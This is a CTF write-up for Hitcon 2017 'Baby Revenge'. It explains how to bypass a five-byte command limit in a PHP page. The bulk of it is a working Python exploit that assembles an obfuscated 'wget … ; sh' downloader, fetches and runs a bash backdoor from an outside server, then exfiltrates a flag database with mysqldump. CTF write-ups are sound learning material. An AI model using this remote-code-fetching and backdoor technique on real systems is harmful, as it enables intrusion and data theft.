---
title: Hitcon CTF 2017 - Baby Revenge
date: '2017-11-06'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- writeup
- hitcon2017
tags:
- web
authors:
- andreafioraldi
---

The page's code is:

```php
<?php
    $sandbox = '/home/andrea/Desktop/fff/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
	highlight_file(__FILE__);
```

You can execute a shell command but you have only 5 bytes.

My idea is to use the 'ls' output to write in a file and execute it.

The target file is '\\' so it does not affect the shell script semantics.

The procedure is:
* create a file
* redirect ls output to '\\'
* remove the file.

I want to write 'wget myserver.com' in this way, and after execute it.

In myserver i have a bash http backdoor, so after downloading it i want to execute it.

```python
import requests
import progressbar

#obfuscated code using ls (max 5 byte each command)
#'wget tuly.pythonanywhere.com; sh index.html'
code = """
>IFS\
ls>>\
rm I*
>=:
ls>>\
rm =:
>a=\
ls>>\
rm a*
>wg\
ls>>\
rm w*
>et:\
ls>>\
rm e*
>tul\
ls>>\
rm t*
>y.\
ls>>\
rm y*
>pyt\
ls>>\
rm p*
>hon\
ls>>\
rm h*
>any\
ls>>\
rm a*
>whe\
ls>>\
rm w*
>re.\
ls>>\
rm r*
>com
ls>>\
rm c*
>b=\
ls>>\
rm b*
>mv:\
ls>>\
rm m*
>ind\
ls>>\
rm i*
>ex.\
ls>>\
rm e*
>ht\
ls>>\
rm h*
>ml:\
ls>>\
rm m*
>p
ls>>\
rm p*
>\$a
>\$b
ls>>\
"""

url = "http://52.199.204.34/"

lines = code.split("\n")

print "Writing downloader..."
with progressbar.ProgressBar(max_value=len(lines)) as bar:
    for i in xrange(len(lines)):
        l = lines[i].rstrip()
        if l == "":
            continue
        requests.get(url + "?cmd=" + l)
        bar.update(i)

print "Executing downloader..."
requests.get(url + "?cmd=sh \\")

print "Executing backdoor..."
requests.get(url + "?cmd=sh p")
```

In the home directory of the system we found that the flag is in the MySQL db

Having a polling backdoor we needed to use one command to exfiltrate the flag from the DB, so we used something like this:
`mysqldump -u user -p'password' flagdb`
Now, there was some issues we faced:
* A lock made our dump query fail
* The database contained chinese characters that as well made our dump query fail
With this in mind we rewrote our query to something like this
`mysqldump -u user -p'password' flagdb --single-transaction --compatible-charset`
